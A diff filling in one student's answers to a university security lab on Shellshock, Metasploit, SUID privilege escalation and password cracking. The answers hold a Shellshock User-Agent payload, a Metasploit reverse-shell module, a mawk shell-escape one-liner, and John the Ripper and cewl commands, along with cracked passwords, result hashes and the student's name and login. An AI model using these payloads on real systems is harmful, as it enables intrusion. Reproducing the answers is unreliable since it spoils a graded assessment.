@@ -16,8 +16,8 @@ Example:
   Your Name: Kyuhong Park
 
 -->
-  Your GT Login ID: 
-  Your Name: 
+  Your GT Login ID: plefforge3
+  Your Name: Sam lefforge
 <--
 
 Task 1
@@ -51,14 +51,14 @@ Example:
   Command : curl http://10.0.2.1:6262/cgi-bin/shellshock.cgi
 
 -->
-  Command : 
+  Command : curl -v -H 'User-Agent: () { :;}; echo; /bin/task2 plefforge3' http://10.0.2.15:80/cgi-bin/shellshock.cgi
 <--
 
 
 2. What hash value is returned by running ./bin/task2 with your student ID.
 
 -->
-  Hash : 
+  Hash : ea20089f0fdd91b8e0446a6132e95f079dde21771a7b96c95da9272f7eccd2ff
 <--
 
 
@@ -71,7 +71,7 @@ Example:
   Module : auxiliary/scanner/portscan/tcp
 
 -->
-  Module : 
+  Module : exploit/multi/http/apache_mod_cgi_bash_env_exec
 <--
 
 
@@ -81,14 +81,14 @@ Example:
   Payload : auxiliary/scanner/portscan/tcp
 
 -->
-  Payload : 
+  Payload : payload/generic/shell_reverse_tcp
 <--
 
 
 3. What hash value is returned by running ./bin/task3 with your student ID.
 
 -->
-  Hash : 
+  Hash : 5fca457b08cdf413a5fc37e39f1e3ec87ef409590bd46260440d271b8c6c1f2e
 <--
 
 
@@ -101,7 +101,7 @@ Example:
   Command : find . php
 
 -->
-  Command : 
+  Command : find / -perm -u=s -type f 2>/dev/null
 <--
 
 
@@ -111,21 +111,21 @@ Example:
   Program : passwd
 
 -->
-  Program : 
+  Program : mawk
 <--
 
 
 3. What command did you use to exploit the setUID vulnerability to spawn a shell.
 
 -->
-  Command : 
+  Command : mawk 'BEGIN {system("/bin/sh")}'
 <--
 
 
 4. What hash value is returned by running ./bin/task4 with your student ID.
 
 -->
-  Hash : 
+  Hash : 1e07a10720412eadf858b9c47ba4dd0b1238922564e1bcd82843844073358df5
 <--
 
 
@@ -135,7 +135,7 @@ Task 5
 1. Give the John the Ripper command you used to find the password of task51.zip.
 
 -->
-  Command : 
+  Command : zip2john task51.zip > zip.hash; john zip.hash
 <--
 
 
@@ -145,40 +145,40 @@ Example:
   Password : 1234
 
 -->
-  Password : 
+  Password : rt76y
 <--
 
 
 3. What hash value is returned by running python task51.pyc with your student ID.
 
 -->
-  Hash : 
+  Hash : 92ee83bbb2efac4e74ba879a97cfde8267e1ef831caf2aef733d337dcec21e7f
 <--
 
 
 4. Give the cewl command you used to create your wordlist.
 
 -->
-  Command : 
+  Command : cewl 10.0.2.15/cgi-bin/shellshock.cgi -d 30 > wordlist.txt 
 <--
 
 
 5. Give the John the Ripper command you used to find the password of task52.pyc.gpg.
 
 -->
-  Command : 
+  Command : john --wordlist=wordlist.txt --rules:Wordlist gpg.hash
 <--
 
 
 6. What is the password for task52.pyc.gpg.
 
 -->
-  Password : 
+  Password : Neuroscience9
 <--
 
 
 7. What hash value is returned by running python task52.pyc with your student ID.
 
 -->
-  Hash : 
+  Hash : 06c50ee72600aa10f565fb90c530608fe9342ff4574021a0aaabd698757973b1
 <--
